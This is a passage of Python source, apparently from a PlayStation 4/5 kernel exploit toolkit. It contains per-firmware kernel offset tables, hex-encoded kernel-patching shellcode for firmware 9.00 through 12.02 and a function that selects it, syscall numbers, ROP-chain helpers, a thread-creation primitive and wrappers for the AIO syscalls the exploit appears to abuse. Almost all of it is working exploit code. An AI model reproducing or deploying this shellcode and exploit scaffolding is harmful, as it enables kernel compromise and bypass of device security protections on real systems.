        "DATA_BASE_GVMSPACE": 0x065540F0,
        "PMAP_STORE_PML4PML4I": -0x105C,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "7.00": {
        "DATA_BASE": 0x00C50000,
        "DATA_SIZE": 0x05191930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x030EDC40,
        "DATA_BASE_ALLPROC": 0x02859D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00AC8064,
        "DATA_BASE_ROOTVNODE": 0x030C7510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02E2C848,
        "DATA_BASE_DATA_CAVE": 0x050A1000,
        "DATA_BASE_GVMSPACE": 0x02E76090,
        "PMAP_STORE_PML4PML4I": -0x10AC,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "7.01": {
        "DATA_BASE": 0x00C50000,
        "DATA_SIZE": 0x05191930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x030EDC40,
        "DATA_BASE_ALLPROC": 0x02859D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00AC8064,
        "DATA_BASE_ROOTVNODE": 0x030C7510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02E2C848,
        "DATA_BASE_DATA_CAVE": 0x050A1000,
        "DATA_BASE_GVMSPACE": 0x02E76090,
        "PMAP_STORE_PML4PML4I": -0x10AC,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "7.20": {
        "DATA_BASE": 0x00C50000,
        "DATA_SIZE": 0x05191930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x030EDC40,
        "DATA_BASE_ALLPROC": 0x02859D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00AC8064,
        "DATA_BASE_ROOTVNODE": 0x030C7510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02E2C848,
        "DATA_BASE_DATA_CAVE": 0x050A1000,
        "DATA_BASE_GVMSPACE": 0x02E76090,
        "PMAP_STORE_PML4PML4I": -0x10AC,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "7.40": {
        "DATA_BASE": 0x00C50000,
        "DATA_SIZE": 0x05191930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x030EDC40,
        "DATA_BASE_ALLPROC": 0x02859D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00AC8064,
        "DATA_BASE_ROOTVNODE": 0x030C7510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02E2C848,
        "DATA_BASE_DATA_CAVE": 0x050A1000,
        "DATA_BASE_GVMSPACE": 0x02E76090,
        "PMAP_STORE_PML4PML4I": -0x10AC,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "7.60": {
        "DATA_BASE": 0x00C50000,
        "DATA_SIZE": 0x05191930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x030EDC40,
        "DATA_BASE_ALLPROC": 0x02859D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00AC8064,
        "DATA_BASE_ROOTVNODE": 0x030C7510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02E2C848,
        "DATA_BASE_DATA_CAVE": 0x050A1000,
        "DATA_BASE_GVMSPACE": 0x02E76090,
        "PMAP_STORE_PML4PML4I": -0x10AC,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "7.61": {
        "DATA_BASE": 0x00C50000,
        "DATA_SIZE": 0x05191930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x030EDC40,
        "DATA_BASE_ALLPROC": 0x02859D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00AC8064,
        "DATA_BASE_ROOTVNODE": 0x030C7510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02E2C848,
        "DATA_BASE_DATA_CAVE": 0x050A1000,
        "DATA_BASE_GVMSPACE": 0x02E76090,
        "PMAP_STORE_PML4PML4I": -0x10AC,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "8.00": {
        "DATA_BASE": 0x00C70000,
        "DATA_SIZE": None,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": None,
        "DATA_BASE_ALLPROC": 0x2875D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00AC3064,
        "DATA_BASE_ROOTVNODE": 0x30FB510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02E48848,
        "DATA_BASE_DATA_CAVE": None,
        "DATA_BASE_GVMSPACE": 0x02EAA090,
        "PMAP_STORE_PML4PML4I": None,
        "PMAP_STORE_DMPML4I": None,
        "PMAP_STORE_DMPDPI": None,
    },
    "8.20": {
        "DATA_BASE": 0x00C70000,
        "DATA_SIZE": None,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": None,
        "DATA_BASE_ALLPROC": 0x2875D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00AC3064,
        "DATA_BASE_ROOTVNODE": 0x30FB510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02E48848,
        "DATA_BASE_DATA_CAVE": None,
        "DATA_BASE_GVMSPACE": 0x02EAA090,
        "PMAP_STORE_PML4PML4I": None,
        "PMAP_STORE_DMPML4I": None,
        "PMAP_STORE_DMPDPI": None,
    },
    "8.40": {
        "DATA_BASE": 0x00C70000,
        "DATA_SIZE": None,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": None,
        "DATA_BASE_ALLPROC": 0x2875D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00AC3064,
        "DATA_BASE_ROOTVNODE": 0x30FB510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02E48848,
        "DATA_BASE_DATA_CAVE": None,
        "DATA_BASE_GVMSPACE": 0x02EAA090,
        "PMAP_STORE_PML4PML4I": None,
        "PMAP_STORE_DMPML4I": None,
        "PMAP_STORE_DMPDPI": None,
    },
    "8.60": {
        "DATA_BASE": 0x00C70000,
        "DATA_SIZE": None,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": None,
        "DATA_BASE_ALLPROC": 0x2875D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00AC3064,
        "DATA_BASE_ROOTVNODE": 0x30FB510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02E48848,
        "DATA_BASE_DATA_CAVE": None,
        "DATA_BASE_GVMSPACE": 0x02EAA090,
        "PMAP_STORE_PML4PML4I": None,
        "PMAP_STORE_DMPML4I": None,
        "PMAP_STORE_DMPDPI": None,
    },
    "9.00": {
        "DATA_BASE": 0x00CA0000,
        "DATA_SIZE": None,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": None,
        "DATA_BASE_ALLPROC": 0x2755D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00D72064,
        "DATA_BASE_ROOTVNODE": 0x2FDB510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02D28B78,
        "DATA_BASE_DATA_CAVE": None,
        "DATA_BASE_GVMSPACE": 0x02D8A570,
        "PMAP_STORE_PML4PML4I": None,
        "PMAP_STORE_DMPML4I": None,
        "PMAP_STORE_DMPDPI": None,
    },
    "9.05": {
        "DATA_BASE": 0x00CA0000,
        "DATA_SIZE": None,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": None,
        "DATA_BASE_ALLPROC": 0x2755D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00D73064,
        "DATA_BASE_ROOTVNODE": 0x2FDB510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02D28B78,
        "DATA_BASE_DATA_CAVE": None,
        "DATA_BASE_GVMSPACE": 0x02D8A570,
        "PMAP_STORE_PML4PML4I": None,
        "PMAP_STORE_DMPML4I": None,
        "PMAP_STORE_DMPDPI": None,
    },
    "9.20": {
        "DATA_BASE": 0x00CA0000,
        "DATA_SIZE": None,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": None,
        "DATA_BASE_ALLPROC": 0x2755D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00D73064,
        "DATA_BASE_ROOTVNODE": 0x2FDB510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02D28B78,
        "DATA_BASE_DATA_CAVE": None,
        "DATA_BASE_GVMSPACE": 0x02D8A570,
        "PMAP_STORE_PML4PML4I": None,
        "PMAP_STORE_DMPML4I": None,
        "PMAP_STORE_DMPDPI": None,
    },
    "9.40": {
        "DATA_BASE": 0x00CA0000,
        "DATA_SIZE": None,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": None,
        "DATA_BASE_ALLPROC": 0x2755D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00D73064,
        "DATA_BASE_ROOTVNODE": 0x2FDB510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02D28B78,
        "DATA_BASE_DATA_CAVE": None,
        "DATA_BASE_GVMSPACE": 0x02D8A570,
        "PMAP_STORE_PML4PML4I": None,
        "PMAP_STORE_DMPML4I": None,
        "PMAP_STORE_DMPDPI": None,
    },
    "9.60": {
        "DATA_BASE": 0x00CA0000,
        "DATA_SIZE": None,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": None,
        "DATA_BASE_ALLPROC": 0x2755D50,
        "DATA_BASE_SECURITY_FLAGS": 0x00D73064,
        "DATA_BASE_ROOTVNODE": 0x2FDB510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02D28B78,
        "DATA_BASE_DATA_CAVE": None,
        "DATA_BASE_GVMSPACE": 0x02D8A570,
        "PMAP_STORE_PML4PML4I": None,
        "PMAP_STORE_DMPML4I": None,
        "PMAP_STORE_DMPDPI": None,
    },
    "10.00": {
        "DATA_BASE": 0x00CC0000,
        "DATA_SIZE": None,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": None,
        "DATA_BASE_ALLPROC": 0x2765D70,
        "DATA_BASE_SECURITY_FLAGS": 0x00D79064,
        "DATA_BASE_ROOTVNODE": 0x2FA3510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02CF0EF8,
        "DATA_BASE_DATA_CAVE": None,
        "DATA_BASE_GVMSPACE": 0x02D52570,
        "PMAP_STORE_PML4PML4I": None,
        "PMAP_STORE_DMPML4I": None,
        "PMAP_STORE_DMPDPI": None,
    },
    "10.01": {
        "DATA_BASE": 0x00CC0000,
        "DATA_SIZE": None,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": None,
        "DATA_BASE_ALLPROC": 0x2765D70,
        "DATA_BASE_SECURITY_FLAGS": 0x00D79064,
        "DATA_BASE_ROOTVNODE": 0x2FA3510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02CF0EF8,
        "DATA_BASE_DATA_CAVE": None,
        "DATA_BASE_GVMSPACE": 0x02D52570,
        "PMAP_STORE_PML4PML4I": None,
        "PMAP_STORE_DMPML4I": None,
        "PMAP_STORE_DMPDPI": None,
    },
}

shellcode_900 = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b080066448991c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c031c0c3"

shellcode_903 = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b08006644899194ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c031c0c3"

shellcode_950 = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68136a51f00eb664489893b6d19006644899124f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c031c0c3"

shellcode_1000 = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2f166000066898164e86100c681cd0a0000ebc6816d2c4700ebc681b12c4700ebc6812d2d4700ebc681712d4700ebc6811d2f4700ebc681cd334700ebc6819d344700eb6689b14ff16100c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68156772600eb664489897b20390066448991a4fa1800c6815f021900ebc78140ea1b004831c0c3c6819ad50e0037c6819dd50e0037c781a02f100102000000488991a82f1001c781cc2f1001010000000f20c0480d000001000f22c031c0c3"

shellcode_1050 = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb00000066898113302100b8eb04000041b9eb00000041baeb000000668981ecb2470041bbeb000000b890e9ffff4881c22d0c05006689b1233021006689b94330210066448981b47d6200c681cd0a0000ebc681bd720d00ebc68101730d00ebc6817d730d00ebc681c1730d00ebc6816d750d00ebc6811d7a0d00ebc681ed7a0d00eb664489899f866200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681c6c10800eb668981d42a2100c7818830210090e93c01c78160ab2d004831c0c3c6812ac4190037c6812dc4190037c781d02b100102000000488991d82b1001c781fc2b1001010000000f20c0480d000001000f22c031c0c3"

shellcode_1100 = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981334c1e00b8eb04000041b9eb00000041baeb000000668981ecc8350041bbeb000000b890e9ffff4881c2611807006689b1434c1e006689b9634c1e0066448981643f6200c681cd0a0000ebc6813ddd2d00ebc68181dd2d00ebc681fddd2d00ebc68141de2d00ebc681eddf2d00ebc6819de42d00ebc6816de52d00eb664489894f486200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126154300eb668981f4461e00c781a84c1e0090e93c01c781e08c08004831c0c3c6816a62150037c6816d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3"

shellcode_1102 = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981534c1e00b8eb04000041b9eb00000041baeb0000006689810cc9350041bbeb000000b890e9ffff4881c2611807006689b1634c1e006689b9834c1e0066448981043f6200c681cd0a0000ebc6815ddd2d00ebc681a1dd2d00ebc6811dde2d00ebc68161de2d00ebc6810de02d00ebc681bde42d00ebc6818de52d00eb66448989ef476200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681b6144300eb66898114471e00c781c84c1e0090e93c01c781e08c08004831c0c3c6818a62150037c6818d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3"

shellcode_1150 = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981acbe2f0041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900eb66898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"

shellcode_1200 = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981ecc02f0041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900eb66898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"


def get_kernel_patches_shellcode():
    if sc.version == "9.00":
        return bytes.fromhex(shellcode_900)
    elif sc.version in ["9.03", "9.04"]:
        return bytes.fromhex(shellcode_903)
    elif sc.version in ["9.50", "9.51", "9.60"]:
        return bytes.fromhex(shellcode_950)
    elif sc.version in ["10.00", "10.01"]:
        return bytes.fromhex(shellcode_1000)
    elif sc.version in ["10.50", "10.70", "10.71"]:
        return bytes.fromhex(shellcode_1050)
    elif sc.version == "11.00":
        return bytes.fromhex(shellcode_1100)
    elif sc.version == "11.02":
        return bytes.fromhex(shellcode_1102)
    elif sc.version in ["11.50", "11.52"]:
        return bytes.fromhex(shellcode_1150)
    elif sc.version in ["12.00", "12.02"]:
        return bytes.fromhex(shellcode_1200)
    else:
        return None


SELECTED_KERNEL_OFFSETS = KERNEL_OFFSETS[sc.platform]
SELECTED_KERNEL_VERSION_OFFSETS = (
    PS4_KERNEL_VERSION_OFFSETS.get(sc.version)
    if sc.platform == "ps4"
    else PS5_KERNEL_VERSION_OFFSETS.get(sc.version)
)
if SELECTED_KERNEL_VERSION_OFFSETS is None:
    raise Exception("Unsupported kernel version: %s" % sc.version)

SYSCALL["unlink"] = 0xA
SYSCALL["pipe"] = 42
SYSCALL["getuid"] = 0x18
SYSCALL["connect"] = 98
SYSCALL["munmap"] = 0x49
SYSCALL["mprotect"] = 0x4A
SYSCALL["getsockopt"] = 0x76
SYSCALL["socketpair"] = 0x87
SYSCALL["thr_self"] = 0x1B0
SYSCALL["thr_exit"] = 0x1AF
SYSCALL["sched_yield"] = 0x14B
SYSCALL["thr_new"] = 0x1C7
SYSCALL["rtprio_thread"] = 0x1D2
SYSCALL["mmap"] = 477
SYSCALL["cpuset_getaffinity"] = 0x1E7
SYSCALL["cpuset_setaffinity"] = 0x1E8
SYSCALL["jitshm_create"] = 0x215
SYSCALL["evf_create"] = 0x21A
SYSCALL["evf_delete"] = 0x21B
SYSCALL["evf_set"] = 0x220
SYSCALL["evf_clear"] = 0x221
SYSCALL["is_in_sandbox"] = 0x249
SYSCALL["dlsym"] = 0x24F
SYSCALL["thr_suspend_ucontext"] = 0x278
SYSCALL["thr_resume_ucontext"] = 0x279
SYSCALL["aio_multi_delete"] = 0x296
SYSCALL["aio_multi_wait"] = 0x297
SYSCALL["aio_multi_poll"] = 0x298
SYSCALL["aio_multi_cancel"] = 0x29A
SYSCALL["aio_submit_cmd"] = 0x29D
SYSCALL["kexec"] = 0x295

LIBC_OFFSETS["A YEAR OF SPRINGS"]["PS4"]["setjmp"] = 0x7E0
LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS4"]["setjmp"] = 0x7E0
LIBC_OFFSETS["A YEAR OF SPRINGS"]["PS4"]["longjmp"] = 0x830
LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS4"]["longjmp"] = 0x830


# sys/socket.h
AF_UNIX = 1
AF_INET = 2
AF_INET6 = 28
SOCK_STREAM = 1
SOCK_DGRAM = 2
SOL_SOCKET = 0xFFFF
SO_REUSEADDR = 4
SO_LINGER = 0x80

# netinet/in.h
IPPROTO_TCP = 6
IPPROTO_UDP = 17
IPPROTO_IPV6 = 41
INADDR_ANY = 0

# netinet/tcp.h
TCP_INFO = 0x20
size_tcp_info = 0xEC

# netinet/tcp_fsm.h
TCPS_ESTABLISHED = 4

# netinet6/in6.h
IPV6_2292PKTOPTIONS = 25
IPV6_PKTINFO = 46
IPV6_NEXTHOP = 48
IPV6_RTHDR = 51
IPV6_TCLASS = 61

# sys/cpuset.h
CPU_LEVEL_WHICH = 3
CPU_WHICH_TID = 1

# sys/mman.h
MAP_SHARED = 1
MAP_FIXED = 0x10
MAP_NO_COALESCE = 0x400000

# sys/rtprio.h
RTP_SET = 1
RTP_PRIO_REALTIME = 2


#

AIO_CMD_READ = 1
AIO_CMD_WRITE = 2
AIO_CMD_FLAG_MULTI = 0x1000
AIO_CMD_MULTI_READ = AIO_CMD_FLAG_MULTI | AIO_CMD_READ
AIO_STATE_COMPLETE = 3
AIO_STATE_ABORTED = 4

PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4

GPU_READ = 0x10
GPU_WRITE = 0x20

# max number of requests that can be created/polled/canceled/deleted/waited
MAX_AIO_IDS = 0x80

# the various SceAIO syscalls that copies out errors/states will not check if
# the address is NULL and will return EFAULT. this dummy buffer will serve as
# the default argument so users don't need to specify one
AIO_ERRORS = alloc(4 * MAX_AIO_IDS)


SCE_KERNEL_ERROR_ESRCH = 0x80020003

CPU_PDE_SHIFT = {
    "PRESENT": 0,
    "RW": 1,
    "USER": 2,
    "WRITE_THROUGH": 3,
    "CACHE_DISABLE": 4,
    "ACCESSED": 5,
    "DIRTY": 6,
    "PS": 7,
    "GLOBAL": 8,
    "XOTEXT": 58,
    "PROTECTION_KEY": 59,
    "EXECUTE_DISABLE": 63,
}

CPU_PDE_MASKS = {
    "PRESENT": 1,
    "RW": 1,
    "USER": 1,
    "WRITE_THROUGH": 1,
    "CACHE_DISABLE": 1,
    "ACCESSED": 1,
    "DIRTY": 1,
    "PS": 1,
    "GLOBAL": 1,
    "XOTEXT": 1,
    "PROTECTION_KEY": 0xF,
    "EXECUTE_DISABLE": 1,
}


CPU_PG_PHYS_FRAME = 0x000FFFFFFFFFF000
CPU_PG_PS_FRAME = 0x000FFFFFFFE00000


GPU_PDE_SHIFT = {
    "VALID": 0,
    "IS_PTE": 54,
    "TF": 56,
    "BLOCK_FRAGMENT_SIZE": 59,
}

GPU_PDE_MASKS = {
    "VALID": 1,
    "IS_PTE": 1,
    "TF": 1,
    "BLOCK_FRAGMENT_SIZE": 0x1F,
}

GPU_PDE_ADDR_MASK = 0x0000FFFFFFFFFFC0


def pin_to_core(core):
    level = 3
    which = 1
    id = 0xFFFFFFFFFFFFFFFF  # -1
    setsize = 0x10
    mask = alloc(0x10)
    mask[0:2] = struct.pack("<H", 1 << core)
    return sc.syscalls.cpuset_setaffinity(level, which, id, setsize, mask)


def get_core_index(mask_addr):
    num = readuint(mask_addr, 4)
    pos = 0
    while num > 0:
        num >>= 1
        pos += 1

    return pos - 1


def get_current_core():
    level = 3
    which = 1
    id = 0xFFFFFFFFFFFFFFFF  # -1
    mask = alloc(0x10)
    sc.syscalls.cpuset_getaffinity(level, which, id, 0x10, mask)
    return get_core_index(get_ref_addr(mask))


def rtprio(type_, prio=0):
    PRI_REALTIME = 2
    rtprio_buf = alloc(4)
    rtprio_buf[0:2] = struct.pack("<H", PRI_REALTIME)
    rtprio_buf[2:4] = struct.pack("<H", prio)
    sc.syscalls.rtprio_thread(type_, 0, rtprio_buf)
    if type_ == RTP_LOOKUP:
        return struct.unpack("<H", rtprio_buf[2:4])[0]


def set_rtprio(prio):
    rtprio(RTP_SET, prio)


def get_rtprio():
    return rtprio(RTP_LOOKUP)


# rop functions


def rop_get_current_core(chain, mask):
    level = 3
    which = 1
    id = 0xFFFFFFFFFFFFFFFF  # -1
    chain.push_syscall(SYSCALL["cpuset_getaffinity"], level, which, id, 0x10, mask)


def rop_pin_to_core(chain, core):
    level = 3
    which = 1
    id = 0xFFFFFFFFFFFFFFFF  # -1
    setsize = 0x10
    mask = alloc(0x10)
    mask[0:2] = struct.pack("<H", 1 << core)
    chain.push_syscall(SYSCALL["cpuset_setaffinity"], level, which, id, setsize, mask)


def rop_set_rtprio(chain, prio):
    PRI_REALTIME = 2
    rtprio_buf = alloc(4)
    rtprio_buf[0:2] = struct.pack("<H", PRI_REALTIME)
    rtprio_buf[2:4] = struct.pack("<H", prio)
    chain.push_syscall(SYSCALL["rtprio_thread"], 1, 0, rtprio_buf)  # RTP_SET


class PrimThread(object):
    def __init__(self, sc, chain):
        self.sc = sc
        self.chain = chain
        self._ready = False
        self.init()

    def init(self):
        jmp_buf = alloc(0x60)
        self.sc.functions.setjmp(jmp_buf)

        self.fpu_ctrl_value = struct.unpack("<I", jmp_buf[0x40:0x44])[0]
        self.mxcsr_value = struct.unpack("<I", jmp_buf[0x44:0x48])[0]

    def prepare_structure(self):
        jmp_buf = alloc(0x60)

        # skeleton jmp_buf
        jmp_buf[0x0:0x8] = struct.pack("<Q", self.sc.exec_addr + self.sc.gadgets["ret"])
        jmp_buf[0x10:0x18] = struct.pack("<Q", self.chain.addr)
        jmp_buf[0x40:0x44] = struct.pack("<I", self.fpu_ctrl_value)
        jmp_buf[0x44:0x48] = struct.pack("<I", self.mxcsr_value)

        # prep structure for thr_new

        stack_size = 0x400
        tls_size = 0x40

        self.thr_new_args = alloc(0x80)
        self.tid_buf = alloc(8)

        cpid = alloc(8)
        stack = alloc(stack_size)
        tls = alloc(tls_size)

        self.thr_new_args[0x0:0x8] = struct.pack(
            "<Q", self.sc.libc_addr + SELECTED_LIBC["longjmp"]
        )  # fn
        self.thr_new_args[0x8:0x10] = struct.pack("<Q", get_ref_addr(jmp_buf))  # arg
        self.thr_new_args[0x10:0x18] = struct.pack("<Q", get_ref_addr(stack))
        self.thr_new_args[0x18:0x20] = struct.pack("<Q", stack_size)
        self.thr_new_args[0x20:0x28] = struct.pack("<Q", get_ref_addr(tls))
        self.thr_new_args[0x28:0x30] = struct.pack("<Q", tls_size)
        self.thr_new_args[0x30:0x38] = struct.pack("<Q", get_ref_addr(self.tid_buf))
        self.thr_new_args[0x38:0x40] = struct.pack("<Q", get_ref_addr(cpid))

        self._ready = True

    def run(self):
        if not self._ready:
            self.prepare_structure()

        if (
            u64_to_i64(
                self.sc.syscalls.thr_new(
                    get_ref_addr(self.thr_new_args),
                    0x68,
                )
            )
            == -1
        ):
            raise Exception(
                "thr_new error: %d\n%s" % (self.sc.errno, self.sc.get_error_string())
            )

        self.ready = False
        self.tid = struct.unpack("<Q", self.tid_buf[0:8])[0]

        return self.tid


"""
int aio_submit_cmd(
    u_int cmd,
    SceKernelAioRWRequest reqs[],
    u_int num_reqs,
    u_int prio,
    SceKernelAioSubmitId ids[]
);
"""


def aio_submit_cmd(cmd, reqs, num_reqs, ids):
    ret = u64_to_i64(sc.syscalls.aio_submit_cmd(cmd, reqs, num_reqs, 3, ids))  # prio
    if ret == -1:
        raise Exception(
            "aio_submit_cmd error: %d\n%s"
            % (
                sc.syscalls.aio_submit_cmd.errno,
                sc.syscalls.aio_submit_cmd.get_error_string(),
            )
        )
    return ret


"""
int aio_multi_delete(
    SceKernelAioSubmitId ids[],
    u_int num_ids,
    int sce_errors[]
);
"""


def aio_multi_delete(ids, num_ids, states=AIO_ERRORS):
    ret = u64_to_i64(sc.syscalls.aio_multi_delete(ids, num_ids, states))
    if ret == -1:
        raise Exception(
            "aio_multi_delete error: %d\n%s"
            % (
                sc.syscalls.aio_multi_delete.errno,
                sc.syscalls.aio_multi_delete.get_error_string(),
            )
        )
    return ret


"""
int aio_multi_poll(
    SceKernelAioSubmitId ids[],
    u_int num_ids,
    int states[]
);
"""


def aio_multi_poll(ids, num_ids, states=AIO_ERRORS):
    ret = u64_to_i64(sc.syscalls.aio_multi_poll(ids, num_ids, states))
    if ret == -1:
        raise Exception(
            "aio_multi_poll error: %d\n%s"
            % (
                sc.syscalls.aio_multi_poll.errno,
                sc.syscalls.aio_multi_poll.get_error_string(),
            )
        )
    return ret


"""
int aio_multi_cancel(
    SceKernelAioSubmitId ids[],
    u_int num_ids,
    int states[]
);
"""


def aio_multi_cancel(ids, num_ids, states=AIO_ERRORS):
    ret = u64_to_i64(sc.syscalls.aio_multi_cancel(ids, num_ids, states))
    if ret == -1:
        raise Exception(
            "aio_multi_cancel error: %d\n%s"
            % (
                sc.syscalls.aio_multi_cancel.errno,
                sc.syscalls.aio_multi_cancel.get_error_string(),
            )
        )
    return ret


"""
int aio_multi_wait(
    SceKernelAioSubmitId ids[],
    u_int num_ids,
    int states[],
    // SCE_KERNEL_AIO_WAIT_*
    uint32_t mode,
    useconds_t *timeout
);
"""


def aio_multi_wait(ids, num_ids, states=AIO_ERRORS, mode=1, timeout=0):
